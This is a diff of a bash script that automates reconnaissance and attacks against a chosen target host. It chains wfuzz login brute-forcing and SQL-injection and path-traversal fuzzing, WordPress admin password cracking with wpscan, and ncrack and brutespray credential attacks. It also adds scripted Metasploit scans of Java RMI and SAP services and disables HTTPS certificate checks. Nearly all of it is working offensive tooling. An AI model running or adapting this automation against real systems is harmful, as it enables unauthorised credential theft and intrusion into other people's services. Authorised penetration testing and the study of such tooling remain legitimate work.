                     varuser=$(echo $line |awk '{print $1}'|cut -d'=' -f1)=FUZZ
                 fi
@@ -1803,12 +1896,11 @@ function fuzzURLs()
     i=0
     for line in $(cat "$RECONDIR"/tmp/${TARGET}.FUZZ.login 2>/dev/null)
     do
-        IFS=' '
         post=$(echo $line|awk '{print $1}')
         url=$(echo $line|awk '{print $2}')
         wfuzzfile=$(echo ${url//\//,} |cut -d',' -f1-4 |cut -d';' -f1)
 
-        $TIMEOUT 900 \
+        timeout --kill-after=10 --foreground 900 \
             wfuzz -o html --hc 404 -z file,$RECONDIR/tmp/users.lst \
             -z file,$RECONDIR/tmp/passwds.lst -d $post "$url" \
             >> "$RECONDIR"/${TARGET}.wfuzz/raws/${wfuzzfile}.logins.wfuzz.${i}.html 2>&1
@@ -1822,7 +1914,6 @@ function fuzzURLs()
     i=0
     for line in $(cat "$RECONDIR"/tmp/${TARGET}.FUZZ 2>/dev/null)
     do
-        IFS=' '
         post=$(echo $line|awk '{print $1}')
         url=$(echo $line|awk '{print $2}')
         #url=${url//\&/\\&}
@@ -1832,36 +1923,66 @@ function fuzzURLs()
         #wfuzzfile=${wfuzzfile//\"/}
         #wfuzzfile=${wfuzzfile//\&/_}
 
-        if [[ $post != "none" ]]
+        if [[ $post == "none" ]]
         then
-            post="-d \"$post\""
-        else
             post=''
+        else
+            post="-d \"$post\""
         fi
 
-        $TIMEOUT 300 \
+        timeout --kill-after=10 --foreground 300 \
             wfuzz -o html --hc 404 -w /usr/share/wfuzz/wordlist/vulns/sql_inj.txt $post "$url" \
             >> "$RECONDIR"/${TARGET}.wfuzz/raws/${wfuzzfile}.sql.wfuzz.${i}.html 2>&1
-        $TIMEOUT 300 \
+        timeout --kill-after=10 --foreground 300 \
             wfuzz -o html --hc 404 -w /usr/share/wfuzz/wordlist/vulns/dirTraversal-nix.txt $post "$url" \
             >> "$RECONDIR"/${TARGET}.wfuzz/raws/${wfuzzfile}.dtnix.wfuzz.${i}.html 2>&1
-        $TIMEOUT 300 \
+        timeout --kill-after=10 --foreground 300 \
             wfuzz -o html --hc 404 -w /usr/share/wfuzz/wordlist/vulns/dirTraversal-win.txt $post "$url" \
             >> "$RECONDIR"/${TARGET}.wfuzz/raws/${wfuzzfile}.dtwin.wfuzz.${i}.html 2>&1
 
         # sometimes timeout command forks badly on exit
-        pkill -t $TTY -f wfuzz
+        pkill -t $TTY -f wfuzz >/dev/null 2>&1
         let i++
     done
 
     for file in "$RECONDIR"/${TARGET}.wfuzz/raws/*.wfuzz.*.html
     do
+        dos2unix "$file" >/dev/null 2>&1
         # change dark theme to light theme
         cat "$file" \
             |sed -e 's/bgcolor=#000000/bgcolor=#FFFFFF/g' \
             |sed -e 's/text=#FFFFFF/text=#000000/g' \
             >> ${file}.1 2>&1
             mv -f ${file}.1 ${file} 2>&1
+
+        # POST wfuzz does multiline.  This will compact the html so we can use the ignore feature.
+        if egrep -q '^<td>[[:space:]]?[[:digit:]]+L</td>$'
+        then
+            IFS=$'\n'
+            inside=0
+            row=()
+            for line in $(cat "$file")
+            do
+                if [[ $line =~ ^\<tr\> ]]
+                then
+                    inside=1
+                    row[${#row[@]}]="$line"
+                elif [[ $inside == 1 ]]
+                then
+                    row[${#row[@]}]="$line"
+                else
+                    echo "$line"
+                fi
+                if [[ $line =~ ^\</tr\> ]]
+                then
+                    row[${#row[@]}]="$line"
+                    echo "${row[@]}"
+                    echo ""
+                    row=()
+                    inside=0
+                fi
+            done
+        fi
 
         ignore=$(cat "$file" \
             |egrep -E "\d*L" \
@@ -1873,6 +1994,7 @@ function fuzzURLs()
             |awk '{print $2".*"$3}')
 
         filename=${file##*/}
+        echo "$ignore" >> "${file}.ignored"
         cat "$file" \
             |egrep -v "$ignore" \
             >> "$RECONDIR"/${TARGET}.wfuzz/${filename%%.wfuzz.*.html}.wfuzz.html 2>&1
@@ -1894,7 +2016,7 @@ function mechDumpURLs()
         |egrep -v '/./$|/../$' \
         |egrep -v '/\?')
     do
-        output=$($TIMEOUT 60 mech-dump --absolute --forms "$url" 2>/dev/null)
+        output=$(timeout --kill-after=10 --foreground 60 mech-dump --absolute --forms "$url" 2>/dev/null)
         if [[ ${#output} -gt 0 ]]
         then
             echo "$BORDER" >> "$RECONDIR"/${TARGET}.mech-dump
@@ -1925,18 +2047,18 @@ function davScanURLs()
         # try multiple DAV scans.  None of these are 100% reliable, so try several.
         echo "$BORDER" >> "$RECONDIR"/${TARGET}.davtest 
         echo "TESTING $url" >> "$RECONDIR"/${TARGET}.davtest 
-        $TIMEOUT 90 davtest -cleanup -url "$url" 2>&1|grep SUCCEED >> "$RECONDIR"/${TARGET}.davtest
+        timeout --kill-after=10 --foreground 90 davtest -cleanup -url "$url" 2>&1|grep SUCCEED >> "$RECONDIR"/${TARGET}.davtest
         echo "$BORDER" >> "$RECONDIR"/${TARGET}.davtest 
 
         echo "$BORDER" >> "$RECONDIR"/${TARGET}.cadaver 
         echo "TESTING $url" >> "$RECONDIR"/${TARGET}.cadaver 
-        echo ls | $TIMEOUT 10 cadaver "$url" 2>&1 \
+        echo ls | timeout --kill-after=10 --foreground 10 cadaver "$url" 2>&1 \
             |egrep -v 'command can only be used when connected to the server.|^Try running|^Could not access|^405 Method|^Connection to' \
             >> "$RECONDIR"/${TARGET}.cadaver
         echo "$BORDER" >> "$RECONDIR"/${TARGET}.cadaver 
 
         port=$(getPortFromUrl "$url")
-        output=$($TIMEOUT 90 nmap -p $port -Pn \
+        output=$(timeout --kill-after=10 --foreground 90 nmap -p $port -Pn \
             --script http-webdav-scan \
             --script-args "http-webdav-scan.path=/${url#*/*/*/}" \
             ${TARGET} 2>&1 )
@@ -1969,7 +2091,7 @@ function exifScanURLs()
         |egrep -i '\.(jpg|jpeg|tif|tiff|wav)$')
     do   
         # download files to /tmp because my /tmp is tmpfs (less i/o)
-        $TIMEOUT 60 wget -q --no-check-certificate -D $TARGET -O /tmp/${TARGET}.exiftestfile "$url"
+        timeout --kill-after=10 --foreground 60 wget -q --no-check-certificate -D $TARGET -O /tmp/${TARGET}.exiftestfile "$url"
         if exif /tmp/${TARGET}.exiftestfile >/dev/null 2>&1 
         then 
             echo "<hr>" >> $exifreport
@@ -1988,7 +2110,7 @@ function exifScanURLs()
 #        |egrep -v '/./$|/../$' |sed -e 's|\(^.*://.*/\).*|\1|'|sort -u)
 #    do
 #        port=$(getPortFromUrl "$url")
-#        output=$($TIMEOUT 60 nmap -T3 -p $port \
+#        output=$(timeout --kill-after=10 --foreground 60 nmap -T3 -p $port \
 #            --script=http-exif-spider \
 #            --script-args "http-exif-spider.url=/${url#*/*/*/}" \
 #            $TARGET 2>&1)
@@ -2026,7 +2148,7 @@ function scanURLs()
 {
     local url
 
-    screen -dmS ${TARGET}.urlsew.$RANDOM $TIMEOUT 28800 \
+    screen -dmS ${TARGET}.urlsew.$RANDOM timeout --kill-after=10 --foreground 28800 \
         eyewitness --threads 1 -d "$RECONDIR"/${TARGET}.urlsEyeWitness \
         --no-dns --no-prompt --all-protocols -f "$RECONDIR"/${TARGET}.urls
 
@@ -2037,7 +2159,7 @@ function scanURLs()
         then
             if ! egrep -q "^$url" "$RECONDIR"/${TARGET}.whatweb 2>/dev/null
             then
-                $TIMEOUT 300 whatweb -a3 --color=never "$url" \
+                timeout --kill-after=10 --foreground 300 whatweb -a3 --color=never "$url" \
                     >> "$RECONDIR"/${TARGET}.whatweb 2>/dev/null
                 echo '' >> "$RECONDIR"/${TARGET}.whatweb 2>/dev/null
             fi
@@ -2050,13 +2172,13 @@ function scanURLs()
         echo "Running wpscan on $url"
         echo "$BORDER" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
         echo "URL: $url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
-        $TIMEOUT 900 wpscan -t 10 --follow-redirection --disable-tls-checks -e \
+        timeout --kill-after=10 --foreground 900 wpscan -t 10 --follow-redirection --disable-tls-checks -e \
             --no-banner --no-color --batch --url "$url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
 
         echo "Running wpscan admin crack on $url"
         echo "$BORDER" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
         echo "CRACKING ADMIN FOR URL: $url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
-        $TIMEOUT 900 wpscan -t 3 --disable-tls-checks --wordlist "$RECONDIR"/tmp/passwds.lst \
+        timeout --kill-after=10 --foreground 900 wpscan -t 3 --disable-tls-checks --wordlist "$RECONDIR"/tmp/passwds.lst \
             --username admin --url "$url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1
     done
 
@@ -2066,7 +2188,7 @@ function scanURLs()
         echo "Running joomscan on $url"
         echo "$BORDER" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
         echo "URL: $url" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
-        $TIMEOUT 900 joomscan -pe -u "$url" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
+        timeout --kill-after=10 --foreground 900 joomscan -pe -u "$url" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
     done
 
     # run fimap on anything with php
@@ -2075,7 +2197,7 @@ function scanURLs()
         echo "Running fimap on $url"
         echo "$BORDER" >> "$RECONDIR"/${TARGET}.fimap 2>&1 
         echo "URL: $url" >> "$RECONDIR"/${TARGET}.fimap 2>&1 
-        $TIMEOUT 300 fimap --force-run -4 -u "$url" 2>&1 \
+        timeout --kill-after=10 --foreground 300 fimap --force-run -4 -u "$url" 2>&1 \
             |egrep -v '^fimap |^Another fimap|^:: |^Starting harvester|^No links found|^AutoAwesome is done' \
             >> "$RECONDIR"/${TARGET}.fimap
     done
@@ -2096,7 +2218,7 @@ function memcacheScan()
     echo "run" >> $cmdfile
     echo "exit" >> $cmdfile
 
-    /usr/share/metasploit-framework/msfconsole -n -r $cmdfile -o "$RECONDIR"/${TARGET}.msf.memcached.${port}.out >/dev/null 2>&1
+    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.msf.memcached.${port}.out >/dev/null 2>&1
 
     # strip hex and convert newlines to real newlines
     perl -pi -e 's|\\r\\n|\n|g' "$RECONDIR"/${TARGET}.msf.memcached.${port}.out 
@@ -2118,7 +2240,7 @@ function ipmiScan()
     echo "run" >> $cmdfile
     echo "exit" >> $cmdfile
 
-    /usr/share/metasploit-framework/msfconsole -n -r $cmdfile >"$RECONDIR"/tmp/msf.ipmi.out 2>&1
+    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile >"$RECONDIR"/tmp/msf.ipmi.out 2>&1
 
     if [[ -f $RECONDIR/${TARGET}.ipmi.john ]]
     then
@@ -2132,15 +2254,82 @@ function ipmiScan()
 ################################################################################
 
 ################################################################################
+function rmiScan()
+{
+    local port
+    local cmdfile="$RECONDIR/tmp/rmiscanscript"
+
+    for port in ${RMIPORTS[@]}
+    do
+        echo "use auxiliary/scanner/misc/java_rmi_server" >> "$cmdfile"
+        echo "set RPORT $port" >> "$cmdfile"
+        echo "set RHOSTS $TARGET" >> "$cmdfile"
+        echo "run" >> "$cmdfile"
+        echo "use auxiliary/gather/java_rmi_registry" >> "$cmdfile"
+        echo "set RPORT $port" >> "$cmdfile"
+        echo "set RHOSTS $TARGET" >> "$cmdfile"
+        echo "run" >> "$cmdfile"
+    done
+    echo "exit" >> "$cmdfile"
+
+    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.rmi >/dev/null 2>&1
+
+    return 0
+}
+################################################################################
+
+################################################################################
+function sapScan()
+{
+    local sapscans=()
+    local msfscan
+    local port
+    local cmdfile="$RECONDIR/tmp/sapscanscript"
+
+    for msfscan in $(/usr/share/metasploit-framework/msfconsole -q -n \
+        -x 'search auxiliary/scanner/sap/; exit'|grep 'auxiliary/scanner/sap/' \
+        |awk '{print $1}')
+    do
+        sapscans[${#sapscans[@]}]=$msfscan
+    done
+
+    for msfscan in ${sapscans[@]}
+    do
+        for port in ${SSLPORTS[@]}
+        do
+            echo "use $msfscan" >> "$cmdfile"
+            echo "set RPORT $port" >> "$cmdfile"
+            echo "set RHOSTS $TARGET" >> "$cmdfile"
+            echo "set SSL true" >> "$cmdfile"
+            echo "run" >> "$cmdfile"
+        done
+        for port in ${NONSSLPORTS[@]}
+        do
+            echo "use $msfscan" >> "$cmdfile"
+            echo "set RPORT $port" >> "$cmdfile"
+            echo "set RHOSTS $TARGET" >> "$cmdfile"
+            echo "set SSL false" >> "$cmdfile"
+            echo "run" >> "$cmdfile"
+        done
+    done
+    echo "exit" >> "$cmdfile"
+
+    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.sap >/dev/null 2>&1
+
+    return 0
+}
+################################################################################
+
+################################################################################
 function crackers()
 {
     screen -dmS ${TARGET}.ncrack.$RANDOM -L -Logfile "$RECONDIR"/${TARGET}.ncrack \
-        $TIMEOUT 28900 \
+        timeout --kill-after=10 --foreground 28900 \
         ncrack -iN "$RECONDIR"/${TARGET}.nmap -U "$RECONDIR"/tmp/users.lst \
         -P "$RECONDIR"/tmp/passwds.lst -v -g CL=2,cr=5,to=8h
 
     screen -dmS ${TARGET}.brutespray.$RANDOM -L -Logfile "$RECONDIR"/${TARGET}.brutespray \
-        $TIMEOUT 28900 \
+        timeout --kill-after=10 --foreground 28900 \
         brutespray --file "$RECONDIR"/${TARGET}.ngrep --threads 2 -c
 
     return 0
@@ -2179,6 +2368,8 @@ function defaultCreds()
 
 # record settings to diff for variable leakage
 set > /tmp/set1
+
+export PYTHONHTTPSVERIFY=0
 
 MAIN $*
 stty sane >/dev/null 2>&1
